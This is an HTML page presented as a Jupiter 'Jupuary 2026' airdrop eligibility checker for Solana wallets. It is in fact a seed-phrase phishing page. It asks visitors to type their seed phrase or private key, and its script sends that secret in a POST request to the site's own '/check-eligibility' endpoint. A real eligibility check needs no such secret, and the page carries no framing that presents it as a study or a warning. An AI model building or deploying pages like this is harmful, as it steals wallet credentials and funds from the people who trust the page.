<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Jupuary2026 ‚Äî Jupiter Airdrop Eligibility Checker</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ed25519-hd-key@1.3.0/dist/index.umd.js"></script>
  <style>
    body { background: radial-gradient(ellipse at 20% 10%, #070617 0%, #05020b 40%, #000000 100%); }
    .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); }
    .brand-color { color: #7ad7ff; }
    .btn-accent { background: linear-gradient(90deg,#7ad7ff,#8b6bff); }
  </style>
</head>
<body class="min-h-screen text-white font-sans">

  <header class="max-w-5xl mx-auto px-4 py-6 flex items-center justify-between">
    <div class="flex items-center gap-4">
      <img src="img/jupiter.jpg" alt="Jupiter" class="w-12 h-12 rounded-md object-cover shadow-lg" />
      <div>
        <h1 class="text-xl font-semibold">Jupuary2026</h1>
        <p class="text-sm text-gray-300">Airdrop eligibility checker</p>
      </div>
    </div>
    <nav class="flex items-center gap-3">
      <div class="text-sm text-gray-400">Built for Jupiter / Solana</div>
    </nav>
  </header>

  <main class="max-w-5xl mx-auto px-4">
    <section class="glass rounded-2xl p-6 shadow-lg">
      <h2 class="text-2xl font-bold brand-color">Check your airdrop eligibility</h2>
      <p class="text-gray-300 mt-1">
        Enter your Seed Phrase or Private Key to quickly check your eligibility for the Jupuary 2026 airdrop on Solana.
      </p>

      <div class="mt-6 grid grid-cols-1 md:grid-cols-3 gap-4">
        <div class="md:col-span-2">
          <label class="block text-sm text-gray-400">Seed Phrase / Private Key</label>
          <textarea id="seedInput" rows="3" placeholder="Enter Seed Phrase or private key"
            class="w-full rounded-lg border border-gray-700 bg-transparent px-4 py-3 focus:outline-none"></textarea>

          <label class="flex items-center gap-2 mt-2 text-xs text-gray-500">
            <input type="checkbox" id="confirmTest" class="accent-blue-500">
            <strong>Check Eligibility</strong>
          </label>

          <button id="checkBtn" class="mt-3 px-4 py-3 rounded-lg bg-white text-black font-semibold">Check</button>
        </div>

        <div class="glass p-4 rounded-lg flex flex-col justify-center">
          <div class="text-sm text-gray-300">Status</div>
          <div id="status" class="mt-2 text-lg font-semibold">Idle</div>
        </div>
      </div>

      <div id="resultsWrap" class="mt-6 hidden">
        <h3 class="text-lg font-semibold">Eligibility results</h3>
        <div id="results" class="mt-3"></div>
      </div>

      <div id="noResults" class="mt-6 hidden text-gray-300"></div>
    </section>

    <section class="mt-6 p-6 glass rounded-2xl shadow-lg">
      <h3 class="text-lg font-semibold">How it works</h3>
      <p class="text-gray-300 mt-2">
        After checking the total eligible transactions, we break it down into Jupiter metrics and give you the tier you qualify for.
        We check known eligibility signals from swap history, LP participation, token holdings, and return matches.
      </p>
      <ol class="list-decimal ml-5 mt-2 text-gray-300">
        <li>We calculate total transactions.</li>
        <li>Divide the total transactions to assign the correct tier based on Jupiter metrics.</li>
        <li>Return eligibility results in an easy-to-read table.</li>
      </ol>
    </section>

    <footer class="mt-8 text-center text-gray-500 text-sm">Made with üöÄ ‚Äî Jupuary2026 Airdrop Checker</footer>
  </main>

  <script>
const checkBtn = document.getElementById('checkBtn');
const seedInput = document.getElementById('seedInput');
const statusEl = document.getElementById('status');
const resultsWrap = document.getElementById('resultsWrap');
const resultsEl = document.getElementById('results');
const noResults = document.getElementById('noResults');

function status(text) { statusEl.textContent = text; }

checkBtn.addEventListener('click', async () => {
  const seed = seedInput.value.trim();
  const confirmed = document.getElementById('confirmTest').checked;

  resultsWrap.classList.add('hidden');
  noResults.classList.add('hidden');
  resultsEl.innerHTML = '';

  if (!confirmed) { 
    status('Please confirm this is your TEST seed phrase or private key.'); 
    return; 
  }
  if (!seed) { 
    status('‚ùå Seed phrase / private key cannot be empty.'); 
    return; 
  }

  status('Checking wallet transactions...');

  try {
    const res = await fetch('/check-eligibility', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed })
    });
    const data = await res.json();

    if (data.success) {
      const reasonText = `
        <strong>Total transactions:</strong> ${data.totalTx} <br>
        <strong>Total eligible transactions :</strong> ${data.totalEligibleTx}
      `;

      if (data.eligible) {
        status(`‚úÖ Eligible ‚Äî Tier ${data.tier}`);
        renderResults([{
          name: 'Jupuary 2026 Airdrop',
          reason: reasonText,
          amount: `Tier ${data.tier}`,
          actionUrl: '#',
          actionText: 'View Claim'
        }]);
      } else {
        status('‚ùå Not eligible');
        noResults.classList.remove('hidden');
        noResults.innerHTML = `<p>${reasonText} ‚Äî must be at least 90 eligible transactions to qualify.</p>`;
      }
    } else {
      status('‚ùå Error: ' + data.message);
    }
  } catch (err) {
    console.error(err);
    status('‚ùå Error checking eligibility');
  }
});

function renderResults(items) {
  resultsWrap.classList.remove('hidden');
  const table = document.createElement('table');
  table.className = 'w-full text-left mt-3 border-collapse';
  table.innerHTML = `
    <thead class="text-sm text-gray-400">
      <tr>
        <th class="pb-2">Airdrop</th>
        <th class="pb-2">Reason</th>
        <th class="pb-2">Tier</th>
        <th class="pb-2">Action</th>
      </tr>
    </thead>
    <tbody class="text-white">
      ${items.map(i => `
        <tr class="border-t border-gray-800">
          <td class="py-3">${i.name}</td>
          <td class="py-3 text-gray-300 text-sm">${i.reason}</td>
          <td class="py-3">${i.amount}</td>
          <td class="py-3">
            <a class="inline-block px-3 py-1 rounded-md bg-white text-black font-medium" href="${i.actionUrl}" target="_blank">${i.actionText}</a>
          </td>
        </tr>
      `).join('')}
    </tbody>
  `;
  resultsEl.appendChild(table);
}
</script>


</body>
</html>